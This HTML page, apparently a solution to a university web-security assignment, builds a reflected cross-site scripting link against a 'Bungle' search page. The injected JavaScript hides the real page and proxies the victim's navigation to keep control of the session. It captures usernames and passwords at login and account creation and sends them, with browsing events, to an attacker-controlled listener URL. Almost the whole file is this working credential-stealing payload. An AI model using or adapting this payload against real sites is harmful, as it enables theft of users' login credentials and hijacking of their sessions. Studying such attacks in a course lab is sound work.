<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>

function payload(attacker) {
	function log(data) {
		console.log($.param(data));
		$.get(attacker, data);
	}

	function fakeButton(e, destination) {
		e.preventDefault();
		history.pushState(destination, "", destination);
		proxy(destination);
	}

	function fakeButtonPOST(e, action) {
		e.preventDefault();
		let destination = "./";
		if (action == "login" || action == "create") {
			let user = $("#username").val(), pw = $("#userpass").val();
			$.post("./" + action, {username: user, password: pw}, function(data) {
				log({event: "login", user: user, password: pw});
				proxy(destination);
			});
		}
		else { /* logout */
			let user = $("#logged-in-user").text();
			$.post("./logout", function(data) {
				log({event: "logout", user: user});
				if (window.location.pathname == "/search") { /* Add a new state only when logging out from the search page */
					history.pushState(destination, "", destination);
				}
				proxy(destination);
			});
		}
	}

	function proxy(href) {
		$("html").load(href, function(){
			$("#bungle-lnk, #search-again-btn").click(function(e) {
				let destination = "./";
				fakeButton(e, destination);
			});

			$("#search-btn").click(function(e) {
				let q = encodeURIComponent($("#query").val());
				let destination = "./search?q=" + q;
				fakeButton(e, destination);
			});

			$("#log-in-btn").click(function(e) {
				fakeButtonPOST(e, "login");
			});

			$("#new-account-btn").click(function(e) {
				fakeButtonPOST(e, "create");
			});
			
			$("#log-out-btn").click(function(e) {
				fakeButtonPOST(e, "logout");
			});

			let loggedUser = $("#logged-in-user").text();
			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href});
			
			$("html").show();
		});
	}

	$("html").hide();
	history.replaceState("./", "", "./");
	window.onpopstate = function(e) {
		proxy(e.state);
	};
	proxy("./");
}

function makeLink(xssdefense, target, attacker) {
	if (xssdefense == 0) {
		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
	} 
	/*else {
	
	}*/
}

var xssdefense = 0;
var target = "http://trurl.cs.illinois.edu/";
var attacker = "http://127.0.0.1:31337/stolen";

$(function() {
	var url = makeLink(xssdefense, target, attacker);
	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>